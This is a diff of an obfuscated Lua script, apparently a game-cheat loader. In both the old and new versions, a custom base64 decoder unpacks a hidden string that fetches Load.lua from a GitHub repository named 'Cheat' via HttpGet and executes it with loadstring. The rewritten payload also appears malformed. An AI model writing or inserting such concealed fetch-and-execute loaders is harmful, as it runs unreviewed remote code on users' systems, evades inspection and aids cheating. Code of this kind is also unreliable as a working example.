@@ -1,19 +1,25 @@
 -- ultra obfuscation start
-local _0x4A = { [1] = string.char, [2] = string.byte, [3] = string.gsub, [4] = table.concat }
-local function _0xB2(_s)
-    local _b='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
-    _s=_0x4A[3](_s,'[^'.._b..'=]','')
-    return (_0x4A[3](_s,'.',function(x)
+local _c = string.char
+local _b = string.byte
+local _g = string.gsub
+
+local function _decode64(d)
+    local b='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
+    d=_g(d,'[^'..b..'=]','')
+    return (_g(d,'.',function(x)
         if x=='=' then return '' end
-        local r,f='',(_b:find(x)-1)
-        for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
+        local r,f='',(b:find(x)-1)
+        for i=6,1,-1 do
+            r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0')
+        end
         return r
     end):gsub('%d%d%d%d%d%d%d%d',function(x)
-        return _0x4A[1](tonumber(x,2))
+        return _c(tonumber(x,2))
     end))
 end
 
-local _0xEE = "bG9hZHN0cmluZyhhZ2FtZTpIdHRwR2V0KCJodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vaHVyb3BwYXIvQ2hlYXQvcmVmcy9oZWFkcy9tYWluL0xvYWQubHVhIikpKCk="
-local _run = loadstring or load
-_run(_0xB2(_0xEE))()
+local payload = "bG9hZHN0cmluZyhHYW1lOkh0dHBHZXRbMV0oIkh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9odXJvcHBhci9DaGVhdC9yZWZzL2hlYWRzL21haW4vTG9hZC5sdWEiKSkp"
+
+local _L = loadstring or load
+_L(_decode64(payload))()
 -- ultra obfuscation end
